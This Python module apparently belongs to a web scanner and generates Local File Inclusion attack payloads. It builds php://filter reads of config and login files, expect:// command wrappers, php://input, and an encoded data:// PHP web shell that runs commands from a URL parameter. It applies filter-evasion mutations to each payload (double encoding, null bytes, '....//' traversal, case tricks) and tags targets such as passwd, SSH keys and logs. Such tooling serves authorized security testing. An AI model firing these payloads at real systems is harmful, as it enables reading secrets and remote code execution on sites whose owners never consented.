import urllib.parse
from dataclasses import dataclass
from pathlib import Path


@dataclass(slots=True, frozen=True)
class LFIPayload:
    value: str
    attack_type: str
    risk_level: str
    expected_file: str  # analyzer가 어떤 정규식을 적용할지 판단하는 기준


PAYLOAD_FILE = (
    Path(__file__).resolve().parents[2]
    / "config"
    / "payloads"
    / "LFI-LFISuite-pathtotest.txt"
)


def _infer_expected_file(payload_value: str) -> str:
    value = payload_value.lower()
    if "data://" in value or "expect://" in value or "php://input" in value:
        return "rce_output"
    if "php://filter" in value:
        if "rot13" in value:
            return "php_rot13"
        return "php_base64"
    if "win.ini" in value or "windows\\win.ini" in value or "boot.ini" in value:
        return "win.ini"
    if "hosts" in value:
        return "hosts"
    if "issue" in value or "release" in value or "version" in value:
        return "os_info"
    if "id_rsa" in value or "id_dsa" in value or "id_ecdsa" in value:
        return "ssh_key"
    if "log" in value:
        return "logs"
    if "passwd" in value:
        return "passwd"
    return "linux_sys"


def _infer_attack_type(expected_file: str) -> str:
    if expected_file == "rce_output":
        return "LFI_RCE_Wrapper"
    if expected_file in ("php_base64", "php_rot13"):
        return "LFI_PHP_Wrapper"
    if expected_file == "win.ini":
        return "LFI_Basic_Windows"
    if expected_file in ("passwd", "linux_sys", "hosts", "os_info", "ssh_key", "logs"):
        return "LFI_Basic_Linux"
    return "LFI_Traversal"


def apply_evasions(base_payload: str, level: int) -> list[tuple[str, str]]:
    """Apply shared LFI payload mutations by evasion level."""
    normalized_level = max(0, min(int(level), 3))
    mutations: list[tuple[str, str]] = [(base_payload, "")]

    if normalized_level >= 1:
        mutations.append((urllib.parse.quote(base_payload, safe=""), "_URL_Encoded"))

    if normalized_level >= 2:
        single_encoded = urllib.parse.quote(base_payload, safe="")
        mutations.append(
            (urllib.parse.quote(single_encoded, safe=""), "_Double_Encoded")
        )
        if not base_payload.endswith("%00"):
            mutations.append((f"{base_payload}%00", "_Null_Byte"))

    if normalized_level >= 3:
        if "../" in base_payload:
            mutations.append((base_payload.replace("../", "....//"), "_Path_Bypass_1"))
            mutations.append((base_payload.replace("../", "..;/"), "_Path_Bypass_2"))
        if "php://filter" in base_payload.lower():
            lower_value = base_payload.lower()
            start = lower_value.find("php://filter")
            end = start + len("php://filter")
            mutations.append(
                (
                    base_payload[:start] + "pHp://FilTer" + base_payload[end:],
                    "_Case_Bypass",
                )
            )

    return mutations


def _get_base_php_wrappers() -> list[str]:
    targets = ["index", "config", "login", "admin", "db", "main", "includes/config"]
    filters = [
        "convert.base64-encode",
        "read=string.rot13",
        "convert.iconv.utf-8.utf-16",
        "zlib.deflate/convert.base64-encode",
        "convert.base64-decode|convert.base64-encode",
    ]

    wrappers: list[str] = []
    for target in targets:
        for file_value in (target, f"{target}.php"):
            for filt in filters:
                wrappers.append(f"php://filter/{filt}/resource={file_value}")

    wrappers.extend(
        [
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
            "expect://id",
            "expect://ls",
            "php://input",
        ]
    )
    return wrappers


def generate_payloads(evasion_level: int = 1) -> list[LFIPayload]:
    payloads: list[LFIPayload] = []
    seen_values: set[str] = set()
    raw_payloads: list[str] = []

    if PAYLOAD_FILE.exists():
        with PAYLOAD_FILE.open("r", encoding="utf-8", errors="ignore") as fh:
            for raw_line in fh:
                value = raw_line.strip()
                if value and not value.startswith("#"):
                    raw_payloads.append(value)

    raw_payloads.extend(_get_base_php_wrappers())

    for base_value in raw_payloads:
        base_expected_file = _infer_expected_file(base_value)
        base_attack_type = _infer_attack_type(base_expected_file)
        base_risk_level = (
            "critical"
            if base_expected_file in ("rce_output", "php_base64", "php_rot13")
            else "high"
        )
        for mutated_value, type_suffix in apply_evasions(base_value, evasion_level):
            if mutated_value in seen_values:
                continue
            seen_values.add(mutated_value)
            # Keep semantic category from the original payload so encoded wrapper
            # variants are still analyzed as wrapper payloads.
            expected_file = base_expected_file
            attack_type = f"{base_attack_type}{type_suffix}"
            risk_level = base_risk_level
            payloads.append(
                LFIPayload(
                    value=mutated_value,
                    attack_type=attack_type,
                    risk_level=risk_level,
                    expected_file=expected_file,
                )
            )

    return payloads